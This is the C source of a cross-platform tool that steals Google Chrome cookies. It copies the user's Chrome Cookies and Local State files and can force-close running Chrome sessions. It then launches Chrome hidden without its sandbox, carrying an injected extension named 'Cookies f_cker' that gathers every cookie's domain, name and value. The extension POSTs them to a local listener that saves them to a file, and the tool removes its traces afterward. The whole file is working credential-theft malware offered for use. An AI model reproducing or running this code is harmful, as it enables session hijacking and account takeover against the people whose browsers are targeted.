#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <pthread.h>
#include <signal.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>

#if (defined(__APPLE__) && defined(__GNUC__)) || defined(__MACOSX__)
    #define _OS_MAC_
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <pwd.h>
    #define CHROME_NAME "Google Chrome"

#elif (defined(_WIN64) || defined(__WIN64__) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__))
    #include <windows.h>
    #include <winsock2.h>
    #define _OS_WINDOWS_
    #define SIGKILL SIGTERM
    #define CHROME_NAME "chrome.exe"

#else
    #define _OS_LINUX_
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <pwd.h>
    #define CHROME_NAME "chrome"
#endif

#define CHROME_DATA "chrome_data"

static signed int status = 0;
static char* cwd = NULL;

#ifdef _OS_WINDOWS_
static int chrome_pid = 0;
#endif

const char* manifest = "{\"manifest_version\": 2,\"name\": \"Cookies f_cker\",\"version\": \"1.0.0\",\"background\": {\"scripts\": [\"content.js\"]},\"permissions\": [\"https://*/*\",\"http://*/*\",\"cookies\"]}";

const char* content = "chrome.cookies.getAll({},function(cks){var result=Array();cks.forEach(function(ck){var m_ck={};m_ck[\"domain\"]=ck.domain;m_ck[\"name\"]=ck.name;m_ck[\"value\"]=ck.value;m_ck[\"hostOnly\"]=ck.hostOnly;m_ck[\"path\"]=ck.path;result.push(m_ck);});(function(data){var url='http://127.0.0.1:65530/';fetch(url,{method:'POST',body:JSON.stringify(data),headers:new Headers({'Content-Type':'application/json'})});}(result));});";

struct t_args
{
    char* chrome_path;
    char* chrome_name;
    char* data_path;
    int force_flag;
};

static struct t_args *args;


char *strrep(const char *s1, const char *s2, const char *s3)
{
    if (!s1 || !s2 || !s3)
        return 0;
    size_t s1_len = strlen(s1);
    if (!s1_len)
        return (char *)s1;
    size_t s2_len = strlen(s2);
    if (!s2_len)
        return (char *)s1;

    size_t count = 0;
    const char *p = s1;
    // assert(s2_len); /* otherwise, strstr(s1,s2) will return s1. */
    do {
        p = strstr(p, s2);
        if (p) {
            p += s2_len;
            ++count;
        }
    } while (p);

    if (!count)
        return (char *)s1;

    size_t s1_without_s2_len = s1_len - count * s2_len;
    size_t s3_len = strlen(s3);
    size_t s1_with_s3_len = s1_without_s2_len + count * s3_len;
    if (s3_len &&
        ((s1_with_s3_len <= s1_without_s2_len) || (s1_with_s3_len + 1 == 0)))
        /* Overflow. */
        return 0;

    char *s1_with_s3 = (char *)malloc(s1_with_s3_len + 1); /* w/ terminator */
    if (!s1_with_s3)
        /* ENOMEM, but no good way to signal it. */
        return 0;

    char *dst = s1_with_s3;
    const char *start_substr = s1;
    size_t i;
    for (i = 0; i != count; ++i) {
        const char *end_substr = strstr(start_substr, s2);
        // assert(end_substr);
        size_t substr_len = end_substr - start_substr;
        memcpy(dst, start_substr, substr_len);
        dst += substr_len;
        memcpy(dst, s3, s3_len);
        dst += s3_len;
        start_substr = end_substr + s2_len;
    }

    /* copy remainder of s1, including trailing '\0' */
    size_t remains = s1_len - (start_substr - s1) + 1;
    // assert(dst + remains == s1_with_s3 + s1_with_s3_len + 1);
    memcpy(dst, start_substr, remains);
    // assert(strlen(s1_with_s3) == s1_with_s3_len);
    return s1_with_s3;
}

void* fake_http_server(FILE* fp){
    printf("[+] starting fake http server...\n");

#ifdef _OS_WINDOWS_
    //Winsows下启用socket
    WSADATA wsadata;
    if(WSAStartup(MAKEWORD(1, 1),&wsadata) == SOCKET_ERROR)
    {
        printf("[!] WSAStartup() fail\n");
        exit(1);
    }
#endif

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1;
    struct sockaddr_in server_socket;
    struct sockaddr_in socket;
    memset(&server_socket, 0, sizeof(server_socket));   // replaced bzero with memset because bzero has never been standard and is built-in on a lot less computers than memset
    server_socket.sin_family = AF_INET;
    server_socket.sin_addr.s_addr = inet_addr("127.0.0.1");
    server_socket.sin_port = htons(65530);

#ifndef _OS_WINDOWS_
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
    {
        printf("[!] setsockopt error!\n");
        status = -1;
    }
#endif

    if(bind(sock,(struct sockaddr*)&server_socket, sizeof(struct sockaddr_in)) < 0)
    {
        printf("[!] bind error!\n");
        status = -1;
    }

    else if(listen(sock, 5) < 0)
    {
        printf("[!] listen error!\n");
        status = -1;
    }
    else
    {
        printf("[+] port 65530 listen success!\n");
    }

    while(!status)
    {
        int len = 0;
        int pl;
        int client_sock = accept(sock, (struct sockaddr*)NULL, NULL);
        if(client_sock < 0)
        {
            perror("[!] client accept error!\n");
            status = -1;
            break;
        }

        while(1)
        {
            char buf[1024];
            memset(buf, '\0', sizeof(buf));
#ifdef _OS_WINDOWS_
            recv(client_sock, buf, sizeof(buf), 0);
#else
            read(client_sock, buf, sizeof(buf));
#endif
            char *cs = strstr(buf, "\r\n\r\n");
            if (cs != 0) fputs((char*)cs + 4, fp);
            else fputs(buf, fp);

            if ((pl = strlen(buf)) < 1024 && buf[pl - 1] != '\n')
            {
                status = 1;
                break;
            }
        }
        close(client_sock);
    }
#ifdef _OS_WINDOWS_
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif
}

void file_copy(const char src[], const char dst[])
{
    FILE *fpbr, *fpbw;

    // Try to open source file
    fpbr = fopen(src, "rb");
    if (fpbr == NULL) {
        printf("[!] Error for opening source file %s!\n", src);
        exit(1);
    }

    // Try to open destination file
    fpbw = fopen(dst, "wb");
    if (fpbr == NULL) {
        printf("[!] Error for opening destination file %s!\n", dst);
        exit(1);
    }

    // Copy file with fread() and fwrite()
    char ch;
    while (fread(&ch, sizeof(char), 1, fpbr) != 0)
        fwrite(&ch, sizeof(char), 1, fpbw);

    // printf("[-] copy file successfully!\n");
    fclose(fpbr);
    fclose(fpbw);
}


int remove_dir(const char *dir)
{
    char cur_dir[] = ".";
    char up_dir[] = "..";
    char dir_name[128];
    DIR *dirp;
    struct dirent *dp;
    struct stat dir_stat;

    if (0 > stat(dir, &dir_stat))
    {
        // perror("get directory stat error!\n");
        unlink(dir);
        return -1;
    }

    if (S_ISREG(dir_stat.st_mode)) { remove(dir); }
    else if (S_ISDIR(dir_stat.st_mode))
    {
        if (0 != access(dir, F_OK))
        {
            printf("[-] %s is not access!\n", dir);
            return 0;
        }

        dirp = opendir(dir);
        while ((dp = readdir(dirp)) != NULL)
        {
            if ((0 == strcmp(cur_dir, dp->d_name)) || (0 == strcmp(up_dir, dp->d_name))) { continue; }

            sprintf(dir_name, "%s/%s", dir, dp->d_name);
            remove_dir(dir_name);
        }
        closedir(dirp);
        int r;
        if ((r = rmdir(dir)) != 0) { remove_dir(dir); }

    }
    else { unlink(dir); }
    return 0;
}

int create_ext()
{
    FILE *fp = fopen("manifest.json", "w");
    fputs(manifest, fp);
    fclose(fp);

    fp = fopen("content.js", "w");
    fputs(content, fp);
    fclose(fp);

    return 0;
}

void clean_ext(char *chrome_dir)
{
    remove("manifest.json");
    remove("content.js");
#ifndef _OS_WINDOWS_
    remove_dir(CHROME_DATA);
#endif
}

char* get_user()
{
#if (defined(_OS_MAC_) || defined(_OS_LINUX_))
    uid_t userid;
    struct passwd* pwd;
    userid = getuid();
    pwd = getpwuid(userid);
    return pwd->pw_name;
#elif defined(_OS_WINDOWS_)
    DWORD size = 32;
    char* user = malloc(32);
    GetUserName(user, &size);
    return user;
#endif
}

void* prepare_env(char* data_path)
{
    char *d_dir = malloc(256);
    sprintf(d_dir, "%s/Default", CHROME_DATA);

    char cookie_path[256];
    char stat_path[256];

#ifdef _OS_WINDOWS_
    sprintf(cookie_path, "%s\\Default\\Cookies", data_path);
    sprintf(stat_path, "%s\\Local State", data_path);
    mkdir(CHROME_DATA);
    mkdir(d_dir);
    file_copy(cookie_path, CHROME_DATA"\\Default\\Cookies");
    file_copy(stat_path, CHROME_DATA"\\Local State");
#else
    sprintf(cookie_path, "%s/Default/Cookies", data_path);
    sprintf(stat_path, "%s/Local State", data_path);
    mkdir(CHROME_DATA, 0777);
    mkdir(d_dir, 0777);
    file_copy(cookie_path, CHROME_DATA"/Default/Cookies");
    file_copy(stat_path, CHROME_DATA"/Local State");
#endif

    printf("[+] env ready!\n");
}


char* find_arg(int argc, char* argv[], char *parameter)
{
    int i;
    char* p;
    for(i = 1; i < argc; i++)
    {
        p = argv[i];
        if (strcmp(p, parameter) == 0)
        {
            if(argv[i + 1]) { return argv[i + 1]; } else { return 1; }
        }
    }
    return NULL;
}

void close_chrome(char* chrome_name)
{
    char cmd[128];
#if defined(_OS_WINDOWS_)
    sprintf(cmd, "taskkill /f /im %s", chrome_name);
#else
    sprintf(cmd, "killall \"%s\"", chrome_name);
#endif
    system(cmd);
}

void* run_chrome(struct t_args* _args)
{
    char* chrome_path = _args->chrome_path;
    char* chrome_name = _args->chrome_name;
    char* data_path = _args->data_path;
    int force_flag = _args->force_flag;

    char* arg1;
    char* arg2 = malloc(128);
    sprintf(arg2, "--load-extension=%s", cwd);

    if (force_flag == 0)
    {
        arg1 = "--user-data-dir="CHROME_DATA;
        prepare_env(data_path);
    }
    else
    {
        arg1 = malloc(128);
        sprintf(arg1, "--user-data-dir=%s", data_path);
    }

    char* cmd = malloc(256);

#if defined(_OS_WINDOWS_)
    sprintf(cmd, "\"%s\" \"%s\" \"%s\" --no-first-run --new-window --test-type --no-sandbox --disable-gpu", chrome_path, arg1, arg2);
    printf("[-] cmd -> %s\n", cmd);

    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess (
        NULL,   // 不在此指定可执行文件的文件名
        cmd,    // 命令行参数
        NULL,   // 默认进程安全性
        NULL,   // 默认进程安全性
        FALSE,  // 指定当前进程内句柄不可以被子进程继承
        CREATE_NEW_CONSOLE, // 为新进程创建一个新的控制台窗口
        NULL,   // 使用本进程的环境变量
        NULL,   // 使用本进程的驱动器和目录
        &si,
        &pi);
    if(bRet)
    {
        // 不使用的句柄最好关掉
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[+] sub process id: %d\n", pi.dwProcessId);
        chrome_pid = pi.dwProcessId;
    }

#else
    sprintf(cmd, "'%s' '%s' '%s' --no-first-run --new-window --test-type --no-sandbox --disable-gpu", chrome_path, arg1, arg2);
    printf("[-] cmd -> %s\n", cmd);
    system(cmd);
#endif

}

#ifndef _OS_WINDOWS_
void sig_handler(int sig)
{
    status = 2;
}
#endif

int main(int argc, char* argv[])
{
    int thrd, thrd2;
    pthread_t ntid, ntid2;

    char *chrome_path = find_arg(argc, argv, "--chrome");
    char *data_path = find_arg(argc, argv, "--data");
    char *save_path = find_arg(argc, argv, "--save");
   
    char *user_name;
    char *chrome_name;

    int fflag = 0;
    args = (struct t_args*)malloc(sizeof(struct t_args));

    if (find_arg(argc, argv, "--help"))
    {
        printf("Usage: %s [options]\t - Code by: Hmiyc\n", argv[0]);
        printf("Options:\n");
        printf("\t--chrome:\tchrome program executable file's path.\n");
        printf("\t--name:  \tchrome program name, only used while target is chrome likely program.(eg:360chrome.exe)\n");
        printf("\t--data:  \tUser data directory.\n");
        printf("\t--user:  \tSpecify different username, useful if whoami's user doesn't match the user's folder name\n");
        printf("\t--save:  \tSave result file's path, default: result.txt in cwd.\n");
        printf("\t--force: \tClose all chrome session and fetch origin cookies.\n");
        printf("\t--help:  \tPrint this.\n");
        return -1;
    }

    if (!save_path)
    {
        save_path = "./result.txt";
    }

    FILE* sfp = fopen(save_path, "w");
    if (access(save_path, F_OK) != 0)
    {
        printf("[!] save file is not writable!\n", save_path);
        return -1;
    }

    if ((chrome_name = find_arg(argc, argv, "--name")) == NULL)
    {
        chrome_name = CHROME_NAME;
    }

    if ((user_name = find_arg(argc, argv, "--user")) == NULL)
    {
        user_name = get_user();
    }

#if defined(_OS_MAC_)
    printf("[-] running in macos...\n");
    cwd = "/tmp";
    chdir(cwd);

    if (!chrome_path)
    {
        chrome_path = "/Applications/Google Chrome.app/Contents/MacOS/"CHROME_NAME;
        printf("[+] use default chrome path: %s\n", chrome_path);
    }

    if (!data_path)
    {
        data_path = malloc(128);
        sprintf(data_path, "/Users/%s/Library/Application Support/Google/Chrome", user_name);
        printf("[+] use default data path: %s\n", data_path);
    }

#elif defined(_OS_WINDOWS_)
    printf("[-] running in windows...\n");
    cwd = malloc(128);
    sprintf(cwd, "C:\\Users\\%s\\AppData\\Local\\Temp", user_name);
    chdir(cwd);
    printf("[+] cwd -> %s\n", cwd);

    if (!chrome_path)
    {
        chrome_path = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\"CHROME_NAME;
        printf("[+] use default chrome path: %s\n", chrome_path);
    }

    if (!data_path)
    {
        data_path = malloc(128);
        sprintf(data_path, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data", user_name);
        printf("[+] use default data path: %s\n", data_path);
    }

#elif defined(_OS_LINUX_)
    printf("[-] running in linux...\n");
    cwd = "/tmp";
    chdir(cwd);

    if (!chrome_path)
    {
        chrome_path = "/opt/google/chrome/"CHROME_NAME;
        printf("[+] use default chrome path: %s\n", chrome_path);
    }

    if (!data_path)
    {
        data_path = malloc(128);
        sprintf(data_path, "/home/%s/.config/google-chrome", user_name);
        printf("[+] use default data path: %s\n", data_path);
    }

    // chrome_real_path = chrome_path;

#endif

    create_ext();

    if (find_arg(argc, argv, "--force"))
    {
        fflag = 1;
        close_chrome(chrome_name);
    }

    if ((access(chrome_path, F_OK) != 0) && (access(chrome_path, F_OK) != 0))
    {
        printf("[!] chrome is not accessable, please reuse --chrome.\n");
        return -1;
    }

    if (access(data_path, F_OK) != 0)
    {
        printf("[!] user data directory is not exist, please reuse --data.\n");
        return -1;
    }

    if ((thrd = pthread_create(&ntid, NULL, fake_http_server, sfp)) != 0)
    {
        printf("[!] create socket thread failed! - %d\n", thrd);
        return -1;
    }

    args->chrome_path = chrome_path;
    args->chrome_name = chrome_name;
    args->data_path = data_path;
    args->force_flag = fflag;

    if ((thrd2 = pthread_create(&ntid2, NULL, run_chrome, args)) != 0)
    {
        printf("[!] run chrome fucker thread failed! - %d\n", thrd2);
        return -1;
    }
    else
    {
#ifndef _OS_WINDOWS_
        signal(SIGTERM, sig_handler);
#endif
        while(!status){};
        if (status == 1) { printf("[+] cookies data recv success!!!\n"); }
        else { printf("[+] task failed!"); }

        clean_ext(CHROME_DATA);
        printf("[+] save result to -> %s\n", save_path);

#if defined(_OS_WINDOWS_)
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, chrome_pid);
        TerminateProcess(hProcess, 0);
        fclose(sfp);
#else
        fclose(sfp);
        kill(0, SIGTERM);
#endif
    }
    return 0;
}
